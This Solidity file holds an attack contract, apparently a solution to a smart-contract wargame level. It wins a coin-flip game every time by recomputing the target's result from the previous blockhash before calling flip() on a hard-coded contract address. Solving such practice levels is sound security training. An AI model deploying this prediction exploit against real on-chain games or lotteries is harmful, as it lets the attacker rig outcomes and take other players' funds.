// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import '@openzeppelin/contracts/math/SafeMath.sol';

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);
    function flip(bool) external returns (bool);
}

contract CoinFlipHack {
    using SafeMath for uint256;

    ICoinFlip public coinFlip = ICoinFlip(0x2fd852b45095fF6048B6Cc42883959d44F4aB521);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function getConsecutiveWins() public view returns (uint256) {
        return coinFlip.consecutiveWins();
    }

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        bool side = blockValue.div(FACTOR) == 1 ? true : false;
        return coinFlip.flip(side);
    }
}
